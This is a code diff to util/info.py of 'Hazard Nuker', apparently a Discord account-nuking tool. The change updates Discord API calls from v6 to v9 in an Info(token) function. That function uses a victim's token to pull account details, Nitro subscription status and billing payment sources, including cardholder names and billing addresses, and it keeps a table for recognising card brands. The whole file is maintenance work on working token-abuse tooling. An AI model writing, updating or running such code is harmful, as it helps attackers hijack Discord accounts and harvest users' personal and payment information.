+++ util/info.py
@@ -2,7 +2,6 @@
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import requests
-import os
 import json
 import Hazard
 
@@ -10,10 +9,10 @@ from time import sleep
 from datetime import datetime
 from colorama import Fore
 
-from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION
+from util.plugins.common import getheaders
 
 def Info(token):
-    r = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token))
+    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
     cc_digits = {
     'american express': '3',
     'visa': '4',
@@ -65,7 +64,7 @@ def Info(token):
             mfa = r.json()['mfa_enabled']
             avatar_id = r.json()['avatar']
             has_nitro = False
-            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
+            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
             nitro_data = res.json()
             has_nitro = bool(len(nitro_data) > 0)
             avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
@@ -78,7 +77,7 @@ def Info(token):
                 days_left = abs((d2 - d1).days)
 
             billing_info = []
-            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token)).json():
+            for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=getheaders(token)).json():
                 y = x['billing_address']
                 name = y['name']
                 address_1 = y['line_1']